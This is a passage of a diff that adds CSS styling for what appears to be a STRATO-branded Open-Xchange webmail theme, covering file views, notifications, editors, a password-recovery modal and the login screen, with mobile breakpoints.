+        background-image: -webkit-linear-gradient(top, #ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%);
+        background-image: linear-gradient(#ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%)
+    }
+
+    .window-sidepanel .links.quota .progress .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    .window-sidepanel .io-ox-quota-view {
+        margin-top: 16px
+    }
+
+    .files-wrapper .files-container.view-icon:focus .file-cell.selected,
+    .files-wrapper .files-container.view-list:focus .file-cell.selected {
+        background: #07b
+    }
+
+    .files-wrapper .files-container.view-icon:focus .file-cell.selected:hover,
+    .files-wrapper .files-container.view-list:focus .file-cell.selected:hover,
+    .files-wrapper .files-container.view-icon:focus .file-cell.selected:focus,
+    .files-wrapper .files-container.view-list:focus .file-cell.selected:focus {
+        background: #004576
+    }
+
+    .files-wrapper .files-container.view-icon .file-cell:hover,
+    .files-wrapper .files-container.view-list .file-cell:hover,
+    .files-wrapper .files-container.view-icon .file-cell:focus,
+    .files-wrapper .files-container.view-list .file-cell:focus {
+        background: #d5d5d5
+    }
+
+    .files-wrapper .files-container.view-icon .file-cell.selected,
+    .files-wrapper .files-container.view-list .file-cell.selected {
+        background: #e5e5e5
+    }
+
+    .files-wrapper .files-container.view-icon .file-cell.selected:hover,
+    .files-wrapper .files-container.view-list .file-cell.selected:hover {
+        background: #f3f3f3
+    }
+
+    .files-wrapper .files-container.view-tile:focus .file-cell.selected {
+        color: #07b
+    }
+
+    .files-wrapper .files-container.view-tile:focus .file-cell.selected .preview-cover {
+        border-color: #07b
+    }
+
+    .files-wrapper .files-container.view-tile:focus .file-cell.selected:hover,
+    .files-wrapper .files-container.view-tile:focus .file-cell.selected:focus {
+        color: #004576
+    }
+
+    .files-wrapper .files-container.view-tile:focus .file-cell.selected:hover .preview-cover,
+    .files-wrapper .files-container.view-tile:focus .file-cell.selected:focus .preview-cover {
+        border-color: #004576
+    }
+
+    .files-wrapper .files-container.view-tile .file-cell:hover,
+    .files-wrapper .files-container.view-tile .file-cell:focus {
+        color: #d5d5d5
+    }
+
+    .files-wrapper .files-container.view-tile .file-cell:hover .preview-cover,
+    .files-wrapper .files-container.view-tile .file-cell:focus .preview-cover {
+        border-color: #d5d5d5
+    }
+
+    .files-wrapper .files-container.view-tile .file-cell.selected {
+        color: #e5e5e5
+    }
+
+    .files-wrapper .files-container.view-tile .file-cell.selected .preview-cover {
+        border-color: #e5e5e5
+    }
+
+    .files-wrapper .files-container.view-tile .file-cell.selected:hover {
+        color: #f3f3f3
+    }
+
+    .files-wrapper .files-container.view-tile .file-cell.selected:hover .preview-cover {
+        border-color: #f3f3f3
+    }
+
+    .window-sidepanel.top-toolbar .folder-tree.has-upsell,
+    .window-sidepanel.bottom-toolbar .folder-tree.has-upsell {
+        bottom: 105px
+    }
+
+    .window-body .list-view-control .toolbar .grid-options {
+        padding-right: 5px
+    }
+
+    .window-body .list-view-control .toolbar a:not(.breadcrumb-link):focus,
+    .window-body .list-view-control .toolbar a:not(.breadcrumb-link):focus i {
+        color: #333
+    }
+
+    .window-body .list-view.visible-selection.has-focus .list-item.selected.deleted {
+        background: #e9f0fa;
+        color: #333
+    }
+
+    .window-sidepanel.visible+.window-body .classic-toolbar .dropdown.pull-right>a {
+        padding: 8px
+    }
+
+    .io-ox-calendar-edit-window .io-ox-calendar-edit .header {
+        display: -webkit-flex;
+        display: flex;
+        -webkit-align-items: center;
+        align-items: center
+    }
+
+    .io-ox-calendar-edit-window .io-ox-calendar-edit h1.clear-title {
+        font-weight: normal
+    }
+
+    .io-ox-calendar-edit-window .io-ox-calendar-edit .header h1.clear-title {
+        font-weight: normal
+    }
+
+    .io-ox-contacts-window .contact-detail .contact-header h1 {
+        font-weight: normal
+    }
+
+    .io-ox-contacts-window .contact-detail .contact-header h2 {
+        font-weight: normal;
+        color: #333
+    }
+
+    .edit-contact h1.name {
+        font-weight: normal
+    }
+
+    .edit-contact legend.group {
+        font-weight: normal;
+        color: #333
+    }
+
+    @media (min-width:480px) {
+
+        .edit-contact legend.simple,
+        .edit-contact label {
+            font-weight: normal
+        }
+    }
+
+    .edit-contact [data-field="note"] label {
+        color: #333;
+        font-weight: bold
+    }
+
+    .io-ox-tasks-edit-window .io-ox-tasks-edit h1.clear-title {
+        font-weight: normal
+    }
+
+    @media (min-width:480px) {
+        .io-ox-tasks-edit-window .row legend {
+            font-weight: normal
+        }
+    }
+
+    .io-ox-tasks-window .progress-bar {
+        background-image: -webkit-linear-gradient(top, #ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%);
+        background-image: linear-gradient(#ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%)
+    }
+
+    .io-ox-tasks-window .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    .io-ox-tasks-window .badge {
+        font-weight: normal;
+        background: #ddd;
+        color: #666;
+        border-radius: 5px;
+        padding: 1px 7px
+    }
+
+    #io-ox-notifications {
+        background: #f8f8f8;
+        top: 105px !important
+    }
+
+    #io-ox-notifications #io-ox-notifications-display {
+        padding-left: 0;
+        padding-right: 0;
+        padding-bottom: 0
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .badge {
+        font-weight: normal;
+        background: #ddd;
+        color: #666;
+        border-radius: 5px;
+        padding: 1px 7px
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .items {
+        padding: 0;
+        margin: 0
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .item:hover {
+        background: #eaeaea
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .item .title {
+        color: #333;
+        font-weight: bold
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .section-title {
+        font-weight: normal;
+        color: #333
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .notifications {
+        border-bottom: 1px dotted #ddd
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .notifications:last-child {
+        border: none
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .btn {
+        outline: none
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .desktop-notification-info .button-wrapper {
+        flex-direction: row-reverse;
+        justify-content: inherit
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .desktop-notification-info .button-wrapper .btn {
+        margin-left: 5px
+    }
+
+    #io-ox-notifications #io-ox-notifications-display :not(.desktop-notification-info) .btn:not(.btn-success):not(.clear-button):not(.btn-danger):not(.btn-warning) {
+        border: none;
+        background: transparent;
+        box-shadow: none;
+        width: auto;
+        min-width: 0;
+        min-height: 30px;
+        color: #07b;
+        padding: 0
+    }
+
+    #io-ox-notifications #io-ox-notifications-display :not(.desktop-notification-info) .btn:not(.btn-success):not(.clear-button):not(.btn-danger):not(.btn-warning):hover {
+        color: #004576;
+        text-decoration: underline
+    }
+
+    #io-ox-notifications #io-ox-notifications-display :not(.desktop-notification-info) .btn:not(.btn-success):not(.clear-button):not(.btn-danger):not(.btn-warning):active {
+        color: #0074b5;
+        text-decoration: underline
+    }
+
+    #io-ox-notifications #io-ox-notifications-display :not(.desktop-notification-info) .btn:not(.btn-success):not(.clear-button):not(.btn-danger):not(.btn-warning).hide-area-button {
+        padding: 0 14px
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .desktop-notification-info .btn {
+        min-width: 0
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .clear-button {
+        color: #666
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .clear-button:focus,
+    #io-ox-notifications #io-ox-notifications-display .clear-button:hover {
+        color: #07b;
+        text-decoration: none
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .clear-button:active {
+        color: #0074b5;
+        text-decoration: none
+    }
+
+    #io-ox-notifications #io-ox-notifications-display .hide-area-button {
+        display: block;
+        text-align: left;
+        padding: 0 14px
+    }
+
+    .ums-iframe-container {
+        width: 100%;
+        height: 100%;
+        max-width: none !important
+    }
+
+    .ums-iframe-container #ums-iframe {
+        width: 100%;
+        height: 100%;
+        border: 0
+    }
+
+    @media (min-width:480px) {
+        .wizard-step {
+            width: 500px
+        }
+    }
+
+    .wizard-step iframe {
+        width: 100%;
+        height: 100%;
+        border: 0;
+        min-height: 210px
+    }
+
+    .smartphone .wizard-container {
+        overflow-y: auto
+    }
+
+    .wizard-backdrop {
+        background: #eee
+    }
+
+    .inline-toolbar>li>a:focus,
+    .classic-toolbar>li>a:focus,
+    .mobile-navbar>li>a:focus {
+        background: transparent;
+        color: #07b
+    }
+
+    .classic-toolbar .dropdown.pull-right>a {
+        color: #333
+    }
+
+    .classic-toolbar .dropdown.pull-right>a:focus,
+    .classic-toolbar .dropdown.pull-right>a:hover {
+        color: #07b;
+        outline: none
+    }
+
+    .classic-toolbar .dropdown.pull-right>a:active {
+        color: #0074b5;
+        outline: none
+    }
+
+    .inline-toolbar .fa-lock {
+        width: 1em
+    }
+
+    .custom-dropdown .upsell {
+        display: none
+    }
+
+    .add-infostore-file .modal-body .io-ox-fileselection li.file.selected * {
+        color: #333
+    }
+
+    .file-list-view.visible-selection.has-focus .list-item.selected .file-type-icon:before,
+    .myshares-list.visible-selection.has-focus .list-item.selected .file-type-icon:before,
+    .myfavorites-list.visible-selection.has-focus .list-item.selected .file-type-icon:before {
+        color: #333
+    }
+
+    .myshares-list.visible-selection.has-focus .list-item.selected a,
+    .myshares-list.visible-selection.has-focus .list-item.selected .type i {
+        color: #333
+    }
+
+    .viewer-dark-theme .viewer-sidebar .description-button,
+    .viewer-sidebar .description-button {
+        color: #07b
+    }
+
+    .viewer-dark-theme .viewer-sidebar .description-button:focus,
+    .viewer-sidebar .description-button:focus,
+    .viewer-dark-theme .viewer-sidebar .description-button:hover,
+    .viewer-sidebar .description-button:hover {
+        color: #004576
+    }
+
+    .viewer-dark-theme .viewer-sidebar .description-button:active,
+    .viewer-sidebar .description-button:active {
+        color: #0074b5
+    }
+
+    .viewer-dark-theme .viewer-sidebar .description-button:focus,
+    .viewer-sidebar .description-button:focus,
+    .viewer-dark-theme .viewer-sidebar .description-button:hover,
+    .viewer-sidebar .description-button:hover,
+    .viewer-dark-theme .viewer-sidebar .description-button:active,
+    .viewer-sidebar .description-button:active {
+        text-decoration: underline
+    }
+
+    .feedback {
+        color: #666;
+        font-size: 13px
+    }
+
+    .feedback .form-control {
+        font-size: 13px
+    }
+
+    .feedback .modal-header {
+        color: #f80
+    }
+
+    .feedback h4,
+    .feedback label {
+        color: #333;
+        font-size: 14px
+    }
+
+    .drag-counter {
+        color: #000
+    }
+
+    .io-ox-alert {
+        z-index: 200000
+    }
+
+    @font-face {
+        font-family: 'OpenSans';
+        src: local(Open Sans);
+        src: url(apps/themes/commons/fonts/OpenSans-Regular.ttf) format("truetype");
+        font-weight: 400
+    }
+
+    @font-face {
+        font-family: 'OpenSans';
+        src: local(Open Sans);
+        src: url(apps/themes/commons/fonts/OpenSans-Bold.ttf) format("truetype");
+        font-weight: bold
+    }
+
+    @font-face {
+        font-family: 'OpenSansSemibold';
+        src: local(Open Sans);
+        src: url(apps/themes/commons/fonts/OpenSans-Semibold.ttf) format("truetype");
+        font-weight: 400
+    }
+
+    .modal.password-lost {
+        font-family: 'OpenSans', Lucida, Arial, sans-serif;
+        z-index: 70000;
+        background: rgba(0, 0, 0, 0.5)
+    }
+
+    .modal.password-lost .modal-header {
+        min-height: auto;
+        padding: 20px 16px 0;
+        border-bottom: 0
+    }
+
+    .modal.password-lost .btn {
+        width: auto;
+        float: right;
+        border-radius: 2px;
+        min-height: 40px;
+        padding: 10px 20px;
+        background: #07b;
+        border: none;
+        color: #fff
+    }
+
+    .modal.password-lost .btn:focus,
+    .modal.password-lost .btn:hover {
+        outline: none;
+        box-shadow: none;
+        background: #00659f
+    }
+
+    .modal.password-lost .btn:active {
+        background: #005383
+    }
+
+    .modal.password-lost .modal-content {
+        max-width: 100vw
+    }
+
+    .modal.password-lost .modal-footer {
+        min-height: auto;
+        padding: 0 16px 20px;
+        border-top: 0
+    }
+
+    .modal.password-lost .modal-footer a {
+        font-size: 14px;
+        padding-top: 10px
+    }
+
+    .modal.password-lost .modal-footer a span {
+        padding-right: 5px
+    }
+
+    @media (max-width:480px) {
+        .modal.password-lost p {
+            font-size: 13px
+        }
+    }
+
+    #io-ox-login-screen {
+        font-family: 'OpenSans', Lucida, Arial, sans-serif
+    }
+
+    #io-ox-login-screen .help {
+        display: none
+    }
+
+    #io-ox-login-screen #io-ox-login-container {
+        color: #333;
+        width: 100%;
+        top: initial;
+        position: initial;
+        -webkit-transform: none;
+        -ms-transform: none;
+        transform: none
+    }
+
+    #io-ox-login-screen #io-ox-login-container #box-form .alert.alert-info,
+    #io-ox-login-screen #io-ox-login-container #box-form .alert.alert-info div {
+        background: #c00;
+        border: #c00;
+        color: #fff
+    }
+
+    #io-ox-login-screen #io-ox-login-container header {
+        z-index: 2;
+        margin: 0;
+        box-sizing: border-box;
+        box-shadow: 0 1px 0 #fff inset;
+        color: #fff;
+        line-height: 20px;
+        min-height: 70px;
+        padding: 25px 30px;
+        width: 100%;
+        background: #f80
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .wrapper {
+        max-width: 1110px;
+        margin: auto;
+        position: relative
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .io-ox-logo {
+        float: left;
+        height: 40px;
+        width: 125px;
+        background: url('images/stratoLogoWeiss.svg') no-repeat 0 0;
+        background-size: contain;
+        position: absolute;
+        top: -5px
+    }
+
+    @media (max-width:480px) {
+        #io-ox-login-screen #io-ox-login-container header .io-ox-logo {
+            height: 20px;
+            width: 15px;
+            background-size: 63px 20px;
+            top: 0
+        }
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages {
+        margin-bottom: 0;
+        margin-right: 10px
+    }
+
+    @media (max-width:480px) {
+        #io-ox-login-screen #io-ox-login-container header #io-ox-languages {
+            margin-right: 0
+        }
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown {
+        position: relative;
+        display: inline
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a {
+        background: none;
+        border: none;
+        padding: 0;
+        color: #fff;
+        width: auto;
+        min-width: 0
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:focus,
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:hover,
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:active {
+        text-decoration: none;
+        border-bottom: 0;
+        box-shadow: none
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:focus>.toggle-text,
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:hover>.toggle-text,
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:active>.toggle-text {
+        border: none
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:focus .caret,
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:hover .caret,
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:active .caret {
+        padding: 0;
+        text-decoration: none;
+        border-bottom: 0;
+        border-top: 3px solid rgba(255, 255, 255, 0.7)
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a .toggle-text {
+        padding: 0 10px
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu {
+        left: 10px;
+        top: 41px;
+        min-width: 130px;
+        box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.1);
+        padding: 0;
+        border-color: #ccc;
+        max-height: none;
+        overflow-y: visible
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu:before {
+        font-size: 15px;
+        position: absolute;
+        top: -30px;
+        left: 12px;
+        border: 1em solid transparent;
+        border-bottom-color: #ccc;
+        content: "";
+        display: block;
+        width: 2em;
+        height: 1em;
+        z-index: 1001
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu:after {
+        font-size: 15px;
+        position: absolute;
+        top: -29px;
+        left: 12px;
+        border: 1em solid transparent;
+        border-bottom-color: #fff;
+        content: "";
+        display: block;
+        width: 2em;
+        height: 1em;
+        z-index: 1002
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu a {
+        height: 40px;
+        box-sizing: border-box;
+        padding: 10px;
+        color: #333
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu a.selected,
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu a:focus,
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu a:hover {
+        background: #f80;
+        color: #fff
+    }
+
+    #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu a:active {
+        background: #dd5800;
+        color: #fff
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links {
+        float: right;
+        font-size: 13px;
+        color: #fff;
+        margin: 0
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li {
+        padding: 0
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a {
+        padding: 0 10px;
+        color: #fff;
+        -webkit-transition: color .2s ease;
+        -o-transition: color .2s ease;
+        transition: color .2s ease
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a.customer-care {
+        padding: 10px 20px;
+        min-width: 100px;
+        border: 1px solid #fff;
+        border-radius: 2px;
+        text-align: center;
+        min-height: 40px;
+        margin-left: 10px;
+        box-sizing: border-box
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:hover,
+    #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:focus {
+        background: #fff;
+        color: #00659f
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:hover span,
+    #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:focus span {
+        border-bottom: none
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:active {
+        background: rgba(255, 255, 255, 0.9);
+        color: #005383
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:active span {
+        border-bottom: none
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a.customer-care span:not(.caret) {
+        padding: 0
+    }
+
+    @media (max-width:480px) {
+        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care {
+            padding: 0
+        }
+
+        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care i {
+            display: none
+        }
+
+        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care span:not(.caret) {
+            padding: 0 5px
+        }
+    }
+
+    @media (max-width:360px) {
+        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care span:not(.caret) {
+            padding: 0 5px
+        }
+    }
+
+    @media (max-width:320px) {
+        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care span:not(.caret) {
+            padding: 0
+        }
+    }
+
+    @media (max-width:480px) {
+        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care {
+            padding: 0;
+            min-width: 0
+        }
+    }
+
+    @media (max-width:320px) {
+        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care {
+            border: 0
+        }
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a:hover,
+    #io-ox-login-screen #io-ox-login-container header .links li a:focus {
+        text-decoration: none;
+        color: rgba(255, 255, 255, 0.7)
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a:hover span,
+    #io-ox-login-screen #io-ox-login-container header .links li a:focus span {
+        border-bottom: 3px solid rgba(255, 255, 255, 0.7)
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a:active {
+        text-decoration: none;
+        color: rgba(255, 255, 255, 0.8)
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a:active span {
+        border-bottom: 3px solid rgba(255, 255, 255, 0.8)
+    }
+
+    #io-ox-login-screen #io-ox-login-container header .links li a span:not(.caret) {
+        padding: 0 10px
+    }
+
+    @media (max-width:480px) {
+        #io-ox-login-screen #io-ox-login-container header .links li a {
+            padding: 0
+        }
+
+        #io-ox-login-screen #io-ox-login-container header .links li a i {
+            display: none
+        }
+
+        #io-ox-login-screen #io-ox-login-container header .links li a span:not(.caret) {
+            padding: 0 5px
+        }
+    }
+
+    @media (max-width:360px) {
+        #io-ox-login-screen #io-ox-login-container header .links li a span:not(.caret) {
+            padding: 0 5px
+        }
+    }
+
+    @media (max-width:320px) {
+        #io-ox-login-screen #io-ox-login-container header .links li a span:not(.caret) {
+            padding: 0
+        }
+    }
+
+    @media (max-width:360px) {
+        #io-ox-login-screen #io-ox-login-container header .links li select {
+            max-width: 75px
+        }
+    }
+
+    @media (max-width:320px) {
+        #io-ox-login-screen #io-ox-login-container header .links li select {
+            max-width: 60px
+        }
+    }
+
+    #io-ox-login-screen #io-ox-login-container #box-form-header {
+        display: block !important;
+        font-family: 'OpenSansSemibold', Lucida, Arial, sans-serif
+    }
+
+    #io-ox-login-screen #io-ox-login-container #box-form-header #io-ox-login-header-prefix {
+        margin-left: 30px
+    }
+
+    #io-ox-login-screen #io-ox-login-container #box-form-header span {
+        color: inherit
+    }
+
+    #io-ox-login-screen #io-ox-login-container #box-form-header i {
+        position: absolute;
+        bottom: 2px;
+        font-size: inherit;
+        color: inherit
+    }
+
+    #io-ox-login-screen #io-ox-login-container #box-form-header h1 {
+        text-align: left
+    }
+
+    #io-ox-login-screen h1 {
+        line-height: 1;
+        font-size: 24px;
+        font-family: 'OpenSansSemibold', Lucida, Arial, sans-serif;
+        color: #666;
+        padding: 0;
+        position: relative
+    }
+
+    #io-ox-login-screen h1 .header-login-title {
+        margin-left: 60px
+    }
+
+    #io-ox-login-screen h1 span {
+        color: inherit
+    }
+
+    #io-ox-login-screen h1 i {
+        position: absolute;
+        bottom: 2px
+    }
+
+    #io-ox-login-screen h1#login-title {
+        margin-bottom: 30px
+    }
+
+    #io-ox-login-screen h2 {
+        margin: 0;
+        padding: 12px 20px;
+        font-size: 16px;
+        font-family: 'OpenSansSemibold', Lucida, Arial, sans-serif;
+        line-height: 1;
+        height: 40px;
+        background: #999;
+        color: #fff
+    }
+
+    #io-ox-login-screen #io-ox-login-container {
+        background-color: #f8f8f8
+    }
+
+    #io-ox-login-screen #io-ox-login-container .feedback {
+        margin-top: 16px
+    }
+
+    #io-ox-login-screen #io-ox-login-container .form-container {
+        padding: 30px 20px
+    }
+
+    #io-ox-login-screen #io-ox-login-container .form-container form {
+        margin-top: -3px
+    }
+
+    #io-ox-login-screen #io-ox-login-container .buttons .form-group {
+        margin-bottom: 0
+    }
+
+    #io-ox-login-screen #io-ox-login-container #io-ox-login-store {
+        margin-bottom: 0
+    }
+
+    #io-ox-login-screen #io-ox-login-container #io-ox-login-store .checkbox {
+        padding-left: 24px
+    }
+
+    #io-ox-login-screen #io-ox-login-container #io-ox-login-store label {
+        margin-top: 10px
+    }
+
+    #io-ox-login-screen #io-ox-login-container #io-ox-login-store .toggle {
+        margin-top: 8px
+    }
+
+    #io-ox-login-screen #io-ox-login-container .fa-envelope,
+    #io-ox-login-screen #io-ox-login-container .fa-lock {
+        position: absolute;
+        color: #999;
+        z-index: 3;
+        bottom: 13px;
+        left: 25px;
+        font-size: 16px
+    }
+
+    #io-ox-login-screen #io-ox-login-container .form-control:not(.btn) {
+        padding-left: 28px;
+        max-width: 340px
+    }
+
+    #io-ox-login-screen #io-ox-login-container .form-control:not(.btn):focus {
+        box-shadow: none
+    }
+
+    #io-ox-login-screen #io-ox-login-container .form-control:not(.btn):focus+i {
+        color: #999
+    }
+
+    #io-ox-login-screen #io-ox-login-container .form-control:not(.btn)[type="password"] {
+        font-family: FontAwesome
+    }
+
+    #io-ox-login-screen #io-ox-login-container .btn {
+        border-radius: 2px;
+        min-height: 40px;
+        padding: 10px 20px;
+        background: #07b;
+        border: none;
+        color: #fff
+    }
+
+    #io-ox-login-screen #io-ox-login-container .btn:focus,
+    #io-ox-login-screen #io-ox-login-container .btn:hover {
+        outline: none;
+        box-shadow: none;
+        background: #00659f
+    }
+
+    #io-ox-login-screen #io-ox-login-container .btn:active {
+        background: #005383
+    }
+
+    #io-ox-login-screen #io-ox-login-container .checkbox.custom input:checked+i.toggle {
+        color: #fff;
+        background-color: #07b;
+        border-color: #07b
+    }
+
+    #io-ox-login-screen #io-ox-login-container label {
+        font-size: 14px;
+        font-weight: normal;
+        color: #333;
+        padding-top: 0
+    }
+
+    #io-ox-login-screen #io-ox-login-container .forgot-password .form-group,
+    #io-ox-login-screen #io-ox-login-container .password .form-group {
+        margin-bottom: 0
+    }
+
+    #io-ox-login-screen #io-ox-login-container a,
+    #io-ox-login-screen #io-ox-login-container .buttons label {
+        color: #07b
+    }
+
+    #io-ox-login-screen #io-ox-login-container a:link,
+    #io-ox-login-screen #io-ox-login-container .buttons label:link {
+        color: #07b
+    }
+
+    #io-ox-login-screen #io-ox-login-container a:focus,
+    #io-ox-login-screen #io-ox-login-container .buttons label:focus,
+    #io-ox-login-screen #io-ox-login-container a:hover,
+    #io-ox-login-screen #io-ox-login-container .buttons label:hover {
+        color: #004576;
+        outline: none
+    }
+
+    #io-ox-login-screen #io-ox-login-container a:active,
+    #io-ox-login-screen #io-ox-login-container .buttons label:active {
+        color: #0074b5;
+        outline: none
+    }
+
+    #io-ox-login-screen #io-ox-login-container a.password,
+    #io-ox-login-screen #io-ox-login-container .buttons label.password {
+        text-align: right;
+        max-width: 340px;
+        font-size: 14px;
+        display: block
+    }
+
+    #io-ox-login-screen #io-ox-login-footer {
+        margin: 0;
+        box-sizing: border-box;
+        box-shadow: 0 1px 0 #fff inset;
+        color: #fff;
+        line-height: 20px;
+        min-height: 70px;
+        padding: 25px 30px;
+        background: #f80;
+        width: 100%
+    }
+
+    #io-ox-login-screen #io-ox-login-footer .composition-element {
+        margin: 0 8px
+    }
+
+    #io-ox-login-screen #io-ox-login-footer .links {
+        float: left;
+        font-size: 13px;
+        color: #fff;
+        margin: 0
+    }
+
+    #io-ox-login-screen #io-ox-login-footer .links li {
+        padding: 0
+    }
+
+    #io-ox-login-screen #io-ox-login-footer .links li:first-child a {
+        border-left: none
+    }
+
+    #io-ox-login-screen #io-ox-login-footer .links li a {
+        border-left: 1px solid #fff;
+        padding: 0 10px;
+        color: #fff;
+        -webkit-transition: color .2s ease;
+        -o-transition: color .2s ease;
+        transition: color .2s ease
+    }
+
+    #io-ox-login-screen #io-ox-login-footer .links li a:hover,
+    #io-ox-login-screen #io-ox-login-footer .links li a:focus {
+        text-decoration: none;
+        color: rgba(255, 255, 255, 0.7)
+    }
+
+    #io-ox-login-screen #io-ox-login-footer .links li a:hover span,
+    #io-ox-login-screen #io-ox-login-footer .links li a:focus span {
+        border-bottom: 3px solid rgba(255, 255, 255, 0.7)
+    }
+
+    #io-ox-login-screen #io-ox-login-footer .links li a:active {
+        text-decoration: none;
+        color: rgba(255, 255, 255, 0.8)
+    }
+
+    #io-ox-login-screen #io-ox-login-footer .links li a:active span {
+        border-bottom: 3px solid rgba(255, 255, 255, 0.8)
+    }
+
+    #io-ox-login-screen #io-ox-login-footer>span,
+    #io-ox-login-screen #io-ox-login-footer .composition-element span {
+        font-size: 13px
+    }
+
+    #io-ox-login-content {
+        flex-shrink: 0
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-content #io-ox-login-box .row #box-form {
+        width: 340px
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container {
+        margin: 0
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-content #box-form #box-form-body {
+        border-top-left-radius: 0;
+        border-top-right-radius: 0
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container .form-container {
+        padding: 0
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container h1 i {
+        bottom: 12px
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-container {
+        margin-top: 0;
+        top: initial
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container label[for="io-ox-login-username"],
+    .smartphone #io-ox-login-screen #io-ox-login-container label[for="io-ox-login-password"] {
+        display: none
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container .form-control[type="password"],
+    .smartphone #io-ox-login-screen #io-ox-login-container .form-control[type="email"] {
+        font-size: 14px;
+        font-family: inherit
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container a,
+    .smartphone #io-ox-login-screen #io-ox-login-container a:focus,
+    .smartphone #io-ox-login-screen #io-ox-login-container a:hover {
+        color: #f80;
+        text-decoration: none
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container a.password {
+        color: #07b
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container a.selected {
+        text-decoration: underline
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-copyright {
+        color: #fff
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-feedback {
+        min-height: 0;
+        margin-bottom: 0
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-languages label {
+        color: #fff
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-store {
+        margin-bottom: 16px
+    }
+
+    @media (max-width:480px) {
+        .smartphone #io-ox-login-screen #io-ox-login-container #box-form .alert {
+            padding: 8px;
+            font-size: 13px
+        }
+
+        .smartphone #io-ox-login-screen #io-ox-login-container header {
+            min-height: 40px;
+            padding: 10px
+        }
+
+        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-footer {
+            padding: 10px
+        }
+    }
+
+    #login-title-mobile {
+        display: none
+    }
+
+    .strato-notification.flex .modal-dialog {
+        width: 900px
+    }
+
+    @media (max-width:1024px) {
+        .strato-notification.flex .modal-dialog {
+            width: 600px
+        }
+    }
+
+    .strato-notification.flex .modal-dialog .close {
